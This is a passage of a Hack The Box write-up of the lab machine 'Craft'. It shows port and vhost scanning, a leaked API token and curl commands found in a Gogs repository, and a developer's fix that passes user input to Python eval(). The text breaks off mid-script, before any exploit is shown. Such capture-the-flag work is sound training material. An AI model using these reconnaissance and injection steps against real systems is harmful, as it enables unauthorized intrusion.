<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Be the hero of your own story!">
    <meta name="author" content="Sabe Barker">

    <title>Craft - Hack The Box · Sabe Barker</title>

    <link rel="canonical" href="https://sabebarker.com/writeups/hackthebox/machines/craft/">

    <!-- Bootstrap core CSS -->
    <link href="/assets/css/bootstrap.min.css" rel="stylesheet">
	<!-- Custom CSS -->
    <link href="/assets/css/sabe.css" rel="stylesheet">
    <!-- Lightbox -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.css" rel="stylesheet">
    <!-- Favicons -->
	<link rel="apple-touch-icon" href="/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
	<link rel="icon" href="/assets/img/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
	<link rel="icon" href="/assets/img/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
	<link rel="manifest" href="/assets/img/favicons/manifest.json">
	<link rel="mask-icon" href="/assets/img/favicons/safari-pinned-tab.svg" color="#8248f6">
	<link rel="icon" href="/assets/img/favicons/favicon.ico">
	<meta name="apple-mobile-web-app-title" content="Sabe Barker">
	<meta name="application-name" content="Sabe Barker">
	<meta name="msapplication-TileColor" content="#fff">
	<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
	<meta name="theme-color" content="#fff">
	
    <!-- Twitter -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@sabebarker">
    <meta name="twitter:creator" content="@sabebarker">
    <meta name="twitter:title" content="Craft - Hack The Box · Sabe Barker">
    <meta name="twitter:description" content="Be the hero of your own story!">
    <meta name="twitter:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/craft/craft_infocard.png">

    <!-- Facebook -->
    <meta property="og:url" content="https://sabebarker.com/writeups/hackthebox/machines/craft/" />
    <meta property="og:title" content="Craft - Hack The Box · Sabe Barker">
    <meta property="og:description" content="Be the hero of your own story!">
    <meta property="og:type" content="website">
    <meta property="og:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/craft/craft_infocard.png">
    <meta property="og:image:secure_url" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/craft/craft_infocard.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <!-- Global site tag (gtag.js) - Google Analytics -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-151243373-1"></script>
	<script>
  		window.dataLayer = window.dataLayer || [];
  		function gtag(){dataLayer.push(arguments);}
  		gtag('js', new Date());

  		gtag('config', 'UA-151243373-1');
	</script>
  </head>
  <body>
    <a class="skippy sr-only sr-only-focusable" href="#content">
      <span class="skippy-text">Skip to main content</span>
    </a>

    <header class="navbar navbar-expand navbar-light flex-column flex-md-row sb-navbar">
      <a class="navbar-brand mr-0 mr-md-2" href="/" aria-label="Sabe Barker"><svg id="Layer_35" enable-background="new 0 0 64 64" height="36" viewBox="0 0 64 64" width="36" class="d-inline-block align-top" style="margin-right: 10px;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="32" x2="32" y1="63" y2="1"><stop offset="0" stop-color="#9f2fff"/><stop offset="1" stop-color="#0bb1d3"/></linearGradient><path d="m42.363 39.397 1.596 1.205c-.446.59-.85 1.22-1.202 1.872l-1.761-.949c.4-.742.86-1.458 1.367-2.128zm.887-1.079 1.5 1.322c1.863-2.112 3.182-4.677 3.814-7.416l-1.949-.45c-.557 2.417-1.721 4.68-3.365 6.544zm-4.689-23.805.878-1.797c-2.33-1.139-4.833-1.716-7.439-1.716s-5.109.577-7.439 1.716l.878 1.797c4.108-2.008 9.014-2.008 13.122 0zm14.439 13.487v.396c0 5.149-1.884 10.104-5.304 13.952-1.738 1.956-2.696 4.473-2.696 7.09v.562c0 3.859-3.14 7-7 7h-12c-3.86 0-7-3.141-7-7v-.562c0-2.616-.958-5.134-2.696-7.09-3.42-3.848-5.304-8.803-5.304-13.952v-.396c0-11.58 9.42-21 21-21s21 9.42 21 21zm-2 0c0-10.477-8.523-19-19-19s-19 8.523-19 19v.396c0 4.659 1.705 9.142 4.799 12.624 2.064 2.321 3.201 5.311 3.201 8.418v.562c0 2.757 2.243 5 5 5h12c2.757 0 5-2.243 5-5v-.562c0-3.106 1.137-6.097 3.201-8.418 3.094-3.482 4.799-7.965 4.799-12.624zm-10 18v4c0 1.654-1.346 3-3 3h-12c-1.654 0-3-1.346-3-3v-4c0-1.654 1.346-3 3-3h12c1.654 0 3 1.346 3 3zm-3-1h-1v2h2v-1c0-.552-.449-1-1-1zm-9 4v2h2v-2zm2-2v-2h-2v2zm2 4h2v-2h-2zm2-4v-2h-2v2zm-10-1v1h2v-2h-1c-.551 0-1 .448-1 1zm1 5h1v-2h-2v1c0 .552.449 1 1 1zm13-1v-1h-2v2h1c.551 0 1-.448 1-1zm-8.618-19h3.236l2.105 4.211c.181.361.277.767.277 1.171 0 1.443-1.174 2.618-2.618 2.618h-2.764c-1.444 0-2.618-1.175-2.618-2.618 0-.404.096-.81.276-1.171zm1.236 2-1.553 3.105c-.043.085-.065.181-.065.277 0 .341.277.618.618.618h2.764c.341 0 .618-.277.618-.618 0-.096-.022-.191-.065-.276l-1.553-3.106zm14.089-16.293-1.218 1.218c2.149 1.225 3.511 3.509 3.511 6.075 0 3.86-3.14 7-7 7-3.067 0-5.987-1.962-6.943-4.667l-.21-.595 10.446-10.446zm-2.708 2.709-6.809 6.809c.862 1.616 2.821 2.775 4.81 2.775 2.757 0 5-2.243 5-5 0-1.989-1.209-3.798-3.001-4.584zm-19.999 11.584c-3.86 0-7-3.14-7-7 0-2.567 1.362-4.851 3.511-6.075l-1.218-1.218 1.414-1.414 10.446 10.446-.21.595c-.956 2.704-3.876 4.666-6.943 4.666zm0-2c1.989 0 3.948-1.159 4.811-2.775l-6.809-6.809c-1.793.786-3.002 2.595-3.002 4.584 0 2.757 2.243 5 5 5zm-14.098-17.676 1.49 1.334c5.498-6.138 13.374-9.658 21.608-9.658v-2c-8.802 0-17.221 3.763-23.098 10.324zm23.098 49.676v2c9.308 0 18.04-4.128 23.958-11.325l-1.545-1.27c-5.537 6.734-13.706 10.595-22.413 10.595zm-28.969-27.649c.032.688.088 1.383.168 2.062l1.986-.232c-.074-.634-.127-1.28-.156-1.922zm4.132 9.256c-.252-.592-.486-1.196-.693-1.799l-1.891.652c.223.646.474 1.297.745 1.932zm-1.256-3.643c-.164-.615-.309-1.247-.429-1.879l-1.965.375c.129.679.285 1.358.461 2.02zm52.186-13.928c.165.617.309 1.249.429 1.879l1.965-.375c-.129-.677-.284-1.356-.461-2.02zm2.876 5.613c-.032-.689-.088-1.383-.168-2.063l-1.986.233c.074.633.127 1.28.156 1.922zm-4.132-9.256c.252.589.485 1.194.694 1.798l1.891-.652c-.224-.65-.475-1.3-.746-1.932zm6.163 21.607c0 1.654-1.346 3-3 3-.117 0-.228-.021-.342-.035-.628 1.241-1.323 2.455-2.112 3.602l-1.647-1.135c.733-1.063 1.377-2.189 1.96-3.338-.53-.541-.859-1.279-.859-2.094 0-1.654 1.346-3 3-3s3 1.346 3 3zm-2 0c0-.552-.449-1-1-1s-1 .448-1 1 .449 1 1 1 1-.448 1-1zm-52.199-28.404c-1.014 1.35-1.904 2.795-2.668 4.299.535.542.867 1.285.867 2.105 0 1.654-1.346 3-3 3s-3-1.346-3-3 1.346-3 3-3c.112 0 .219.021.328.033.821-1.623 1.779-3.183 2.874-4.639zm-3.801 6.404c0-.551-.449-1-1-1s-1 .449-1 1 .449 1 1 1 1-.449 1-1z" fill="url(#SVGID_1_)"/></svg>{ sabebarker }
      </a>

      <div class="navbar-nav-scroll">
        <ul class="navbar-nav sb-navbar-nav flex-row">
          <li class="nav-item">
            <a class="nav-link " href="/search">
        <svg height="15" class="octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search" viewBox="0 0 16 16" version="1.1" width="15" aria-hidden="true"><path fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0013 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 000-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"/></svg>
      </a>
          </li>
          <li class="nav-item">
            <a class="nav-link " href="/">
	      Home
	     </a>
          </li>
          <li class="nav-item">
            <a class="nav-link " href="/blog">
	      Blog
	    </a>
          </li>
          <li class="nav-item">
            <a class="nav-link active" href="/writeups">
	      Writeups
	    </a>
          </li>
          <li class="nav-item">
            <a class="nav-link " href="/tools">
	      Tools
	    </a>
          </li>
        </ul>
      </div>

      <ul class="navbar-nav flex-row ml-md-auto d-none d-md-flex">
        <li class="nav-item">
          <a class="nav-link p-2" href="https://github.com/sabebarker" target="_blank" rel="noopener" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 512 499.36" role="img" focusable="false"><title>GitHub</title><path fill="currentColor" fill-rule="evenodd" d="M256 0C114.64 0 0 114.61 0 256c0 113.09 73.34 209 175.08 242.9 12.8 2.35 17.47-5.56 17.47-12.34 0-6.08-.22-22.18-.35-43.54-71.2 15.49-86.2-34.34-86.2-34.34-11.64-29.57-28.42-37.45-28.42-37.45-23.27-15.84 1.73-15.55 1.73-15.55 25.69 1.81 39.21 26.38 39.21 26.38 22.84 39.12 59.92 27.82 74.5 21.27 2.33-16.54 8.94-27.82 16.25-34.22-56.84-6.43-116.6-28.43-116.6-126.49 0-27.95 10-50.8 26.35-68.69-2.63-6.48-11.42-32.5 2.51-67.75 0 0 21.49-6.88 70.4 26.24a242.65 242.65 0 0 1 128.18 0c48.87-33.13 70.33-26.24 70.33-26.24 14 35.25 5.18 61.27 2.55 67.75 16.41 17.9 26.31 40.75 26.31 68.69 0 98.35-59.85 120-116.88 126.32 9.19 7.9 17.38 23.53 17.38 47.41 0 34.22-.31 61.83-.31 70.23 0 6.85 4.61 14.81 17.6 12.31C438.72 464.97 512 369.08 512 256.02 512 114.62 397.37 0 256 0z"/></svg></a>
       </li>
       <li class="nav-item">
         <a class="nav-link p-2" href="https://twitter.com/sabebarker" target="_blank" rel="noopener" aria-label="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 512 416.32" role="img" focusable="false"><title>Twitter</title><path fill="currentColor" d="M160.83 416.32c193.2 0 298.92-160.22 298.92-298.92 0-4.51 0-9-.2-13.52A214 214 0 0 0 512 49.38a212.93 212.93 0 0 1-60.44 16.6 105.7 105.7 0 0 0 46.3-58.19 209 209 0 0 1-66.79 25.37 105.09 105.09 0 0 0-181.73 71.91 116.12 116.12 0 0 0 2.66 24c-87.28-4.3-164.73-46.3-216.56-109.82A105.48 105.48 0 0 0 68 159.6a106.27 106.27 0 0 1-47.53-13.11v1.43a105.28 105.28 0 0 0 84.21 103.06 105.67 105.67 0 0 1-47.33 1.84 105.06 105.06 0 0 0 98.14 72.94A210.72 210.72 0 0 1 25 370.84a202.17 202.17 0 0 1-25-1.43 298.85 298.85 0 0 0 160.83 46.92"/></svg></a>
       </li>
       <li class="nav-item">
         <a class="nav-link p-2" href="https://facebook.com/sabebarker2600" target="_blank" rel="noopener" aria-label="Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewBox="0 0 24 24" role="img" focusable="false"><title>Facebook</title><path fill="currentColor" d="M210.787 234.832l68.31-22.883 22.1 65.977-68.309 22.882z"/><path fill="currentColor" d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"/></svg></a>
       </li>
      </ul>
    </header>


    <div class="container-fluid">
      <div class="row flex-xl-nowrap">
        <div class="col-12 col-md-3 col-xl-2 sb-sidebar">
          <button class="btn btn-link sb-search-docs-toggle d-md-none p-0 ml-3" type="button" data-toggle="collapse" data-target="#sb-docs-nav" aria-controls="sb-docs-nav" aria-expanded="false" aria-label="Toggle docs navigation"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 30 30" role="img" focusable="false"><title>Menu</title><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"/></svg></button>

<nav class="collapse sb-links" id="sb-docs-nav"><div class="sb-toc-item">
      <a class="sb-toc-link" href="/writeups/hackthebox/getting-started/introduction/">
        Getting Started
      </a>

      <ul class="nav sb-sidenav"><li>
            <a href="/writeups/hackthebox/getting-started/introduction/">
              Introduction
            </a>
          </li><li>
            <a href="/writeups/hackthebox/getting-started/basic-setup/">
              Basic Setup
            </a>
          </li><li>
            <a href="/writeups/hackthebox/getting-started/vpn-setup/">
              VPN Setup
            </a>
          </li></ul>
    </div><div class="sb-toc-item active">
      <a class="sb-toc-link" href="/writeups/hackthebox/machines/postman/">
        Machines
      </a>

      <ul class="nav sb-sidenav"><li>
            <a href="/writeups/hackthebox/machines/postman/">
              Postman
            </a>
          </li><li>
            <a href="/writeups/hackthebox/machines/scavenger/">
              Scavenger
            </a>
          </li><li>
            <a href="/writeups/hackthebox/machines/json/">
              Json
            </a>
          </li><li>
            <a href="/writeups/hackthebox/machines/ai/">
              AI
            </a>
          </li><li>
            <a href="/writeups/hackthebox/machines/bitlab/">
              Bitlab
            </a>
          </li><li class="active sb-sidenav-active">
            <a href="/writeups/hackthebox/machines/craft/">
              Craft
            </a>
          </li><li>
            <a href="/writeups/hackthebox/machines/networked/">
              Networked
            </a>
          </li></ul>
    </div></nav>
        </div>

        
          <div class="d-none d-xl-block col-xl-2 sb-toc">
            <ul class="section-nav">
<li class="toc-entry toc-h2"><a href="#enumeration">Enumeration</a>
<ul>
<li class="toc-entry toc-h3"><a href="#portscan">Portscan</a></li>
<li class="toc-entry toc-h3"><a href="#vhosts">VHosts</a></li>
<li class="toc-entry toc-h3"><a href="#domains">Domains</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#foothold">Foothold</a>
<ul>
<li class="toc-entry toc-h3"><a href="#information-leak">Information Leak</a></li>
<li class="toc-entry toc-h3"><a href="#digging-deeper">Digging Deeper</a></li>
<li class="toc-entry toc-h3"><a href="#chroot">Chroot</a></li>
</ul>
</li>
<li class="toc-entry toc-h2"><a href="#user">User</a></li>
<li class="toc-entry toc-h2"><a href="#root">Root</a></li>
<li class="toc-entry toc-h2"><a href="#conclusion">Conclusion</a></li>
</ul>
          </div>
        

        <main class="col-12 col-md-9 col-xl-8 py-md-3 pl-md-5 sb-content" role="main">
          <h1 class="sb-title" id="content">Craft</h1>
          <p class="sb-lead">Be the hero of your own story!</p>
          <p class="text-center"><img src="/assets/img/writeups/hackthebox/machines/craft/craft_infocard.png" alt="HackTheBox Craft Machine Info Card" class="img-fluid" /></p>

<p><strong>Craft</strong> is a medium difficulty machine running Linux. It tests your knowledge in <em>Git</em> and <em>Python</em> as well as tests your ability to review documentation of programs you may not have come across before. This machine isn’t difficult but like most things if you think too much in to the situation it will seem harder than it really is.</p>

<p>Be sure to checkout the <a href="/writeups/hackthebox/getting-started/basic-setup/">Basic Setup</a> section  before you get started.</p>

<h2 id="enumeration">Enumeration</h2>

<p>Like always, enumeration is our first port of call. Let’s take a look at the machine and see what we are dealing with.</p>

<h3 id="portscan">Portscan</h3>

<p>First off let’s do our <a href="/writeups/hackthebox/getting-started/basic-setup/#portscan">portscan</a> so we know what services may be running:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">portscan craft.htb
Grabbing ports...
Ports grabbed!
Scanning...
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-12-14 17:46 PST
Nmap scan report <span class="k">for </span>craft.htb <span class="o">(</span>10.10.10.110<span class="o">)</span>
Host is up <span class="o">(</span>0.32s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 <span class="o">(</span>RSA<span class="o">)</span>
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 <span class="o">(</span>ED25519<span class="o">)</span>
443/tcp  open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>craft.htb/organizationName<span class="o">=</span>Craft/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
6022/tcp open  ssh      <span class="o">(</span>protocol 2.0<span class="o">)</span>
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb <span class="o">(</span>RSA<span class="o">)</span>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6022-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>12/14%Time<span class="o">=</span>5DF59092%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>N
SF:ULL,C,<span class="s2">"SSH-2</span><span class="se">\.</span><span class="s2">0-Go</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>54.67 seconds</code></pre></figure>

<p>We find three open ports and two different services. Ports <code class="highlighter-rouge">22</code> and <code class="highlighter-rouge">6022</code> has <code class="highlighter-rouge">ssh</code> services running and port <code class="highlighter-rouge">443</code> has the <code class="highlighter-rouge">nginx</code> service running. Knowing that <code class="highlighter-rouge">nginx</code> is a web service lets enumerate any other directories or vhosts.</p>

<h3 id="vhosts">VHosts</h3>

<p><em>Gobuster</em> has three different modes. We will take a look at the <code class="highlighter-rouge">vhost</code> mode for bruteforcing virtual hosts.</p>

<p>Doing a scan with <em>Gobuster</em> reveals two additional vhosts for <code class="highlighter-rouge">craft.htb</code>:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gobuster vhost <span class="nt">-u</span> https://craft.htb <span class="nt">-t</span> 30 <span class="nt">-k</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:          https://craft.htb
<span class="o">[</span>+] Threads:      30
<span class="o">[</span>+] Wordlist:     /usr/share/wordlists/dirb/big.txt
<span class="o">[</span>+] User Agent:   gobuster/3.0.1
<span class="o">[</span>+] Timeout:      10s
<span class="o">===============================================================</span>
2019/12/15 00:45:22 Starting gobuster
<span class="o">===============================================================</span>
Found: api.craft.htb <span class="o">(</span>Status: 404<span class="o">)</span> <span class="o">[</span>Size: 233]
Found: vault.craft.htb <span class="o">(</span>Status: 404<span class="o">)</span> <span class="o">[</span>Size: 19]
<span class="o">===============================================================</span>
2019/12/15 00:44:19 Finished
<span class="o">===============================================================</span></code></pre></figure>

<p>Let’s add them to our <code class="highlighter-rouge">/etc/hosts</code> so we can navigate to these pages.</p>

<h3 id="domains">Domains</h3>

<p>First we navigate to <code class="highlighter-rouge">https://craft.htb</code> which is the main domain. We come across a website:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/craft/craft.htb.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/craft/craft.htb.png" alt="Craft Main Screenshot" class="img-fluid" /></a></p>

<p>On this page we can see two links to the right of the top navbar.</p>

<p>The API Link <code class="highlighter-rouge">api.craft.htb/api/</code> takes us to what seems to be documentation and demonstration of the <code class="highlighter-rouge">Craft API</code>:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/craft/api.craft.htb.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/craft/api.craft.htb.png" alt="Craft API Screenshot" class="img-fluid" /></a></p>

<p>The other icon is the Git logo which links to <code class="highlighter-rouge">https://gogs.craft.htb</code> another vhost.
Adding gogs.craft.htb to <code class="highlighter-rouge">/etc/hosts</code> we navigate to a self-hosted git service called “Gogs”:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb.png" alt="Craft Gogs Screenshot" class="img-fluid" /></a></p>

<h2 id="foothold">Foothold</h2>

<p>When going to the <em>Explore</em> link at Gogs we see a public repository called <code class="highlighter-rouge">Craft/craft-api</code>:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb_explore.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb_explore.png" alt="Gogs Repo Craft API Screenshot" class="img-fluid" /></a></p>

<h3 id="information-leak">Information Leak</h3>

<p>On inspection of the repo we find a submitted issue by <code class="highlighter-rouge">Dinesh Chugtai</code>:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb_craft-api_issues.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb_craft-api_issues.png" alt="Gogs Repo Craft API Issues Screenshot" class="img-fluid" /></a></p>

<p>We find that <em>Dinesh</em> references the command:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">curl <span class="nt">-H</span> <span class="s1">'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw'</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-k</span> <span class="nt">-X</span> POST https://api.craft.htb/api/brew/ <span class="nt">--data</span> <span class="s1">'{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'</span></code></pre></figure>

<p>The issue seems to be in regards to bogus <code class="highlighter-rouge">abv</code> values being able to be added to the database. Dinesh is asked by the developers to push a fix to the repository which he does:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb_craft-api_issue-fix.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb_craft-api_issue-fix.png" alt="Gogs Repo Craft API Issue Fix Screenshot" class="img-fluid" /></a></p>

<p>We see that Dinesh, for whatever reason, has opted to use <em>pythons</em> <code class="highlighter-rouge">eval()</code> function with <code class="highlighter-rouge">%s</code> allowing a custom string.</p>

<p>A comment made by another developer confirms this is most likey the case:</p>

<p><a href="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb_craft-api_issue-comment.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/craft/gogs.craft.htb_craft-api_issue-comment.png" alt="Gogs Repo Craft API Issue Fix Comment Screenshot" class="img-fluid" /></a></p>

<p>When trying to use <em>Dinesh’s</em> <code class="highlighter-rouge">curl</code> command we found earlier in the issue we get the response: <code class="highlighter-rouge">{"message": "The browser (or proxy) sent a request that this server could not understand."}</code></p>

<p>If we try to use it with other commands found at the api page such as:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">curl <span class="nt">-X</span> GET <span class="s2">"https://api.craft.htb/api/auth/check"</span> <span class="nt">-H</span>  <span class="s2">"accept: application/json"</span> <span class="nt">-H</span> <span class="s1">'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw'</span> <span class="nt">-k</span></code></pre></figure>

<p>We get the reponse <code class="highlighter-rouge">{"message": "Invalid token or no token found."}</code>. The token is potentially not valid anymore.</p>

<h3 id="digging-deeper">Digging Deeper</h3>

<p>Going back to searching the repository we find a <code class="highlighter-rouge">tests</code> directory that contains a python script that was created by Dinesh. It seems he was using it to run tests on his awesome “fix”:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/auth/login'</span><span class="p">,</span>  <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s">''</span><span class="p">,</span> <span class="s">''</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="n">json_response</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
<span class="n">token</span> <span class="o">=</span>  <span class="n">json_response</span><span class="p">[</span><span class="s">'token'</span><span class="p">]</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s">'X-Craft-API-Token'</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span>  <span class="p">}</span>

<span class="c1"># make sure token is valid
</span><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/auth/check'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>

<span class="c1"># create a sample brew with bogus ABV... should fail.
</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Create bogus ABV brew"</span><span class="p">)</span>
<span class="n">brew_dict</span> <span class="o">=</span> <span class="p">{}</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'abv'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'15.0'</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit'</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'brewer'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit'</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'style'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit'</span>

<span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">brew_dict</span><span class="p">)</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://api.craft.htb/api/brew/'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json_data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>


<span class="c1"># create a sample brew with real ABV... should succeed.
</span><span class="k">print</span><span class="p">(</span><span class="s">"Create real ABV brew"</span><span class="p">)</span>
<span class="n">brew_dict</span> <span class="o">=</span> <span class="p">{}</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'abv'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'0.15'</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit'</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'brewer'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit'</span>
<span class="n">brew_dict</span><span class="p">[</span><span class="s">'style'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'bullshit'</span>

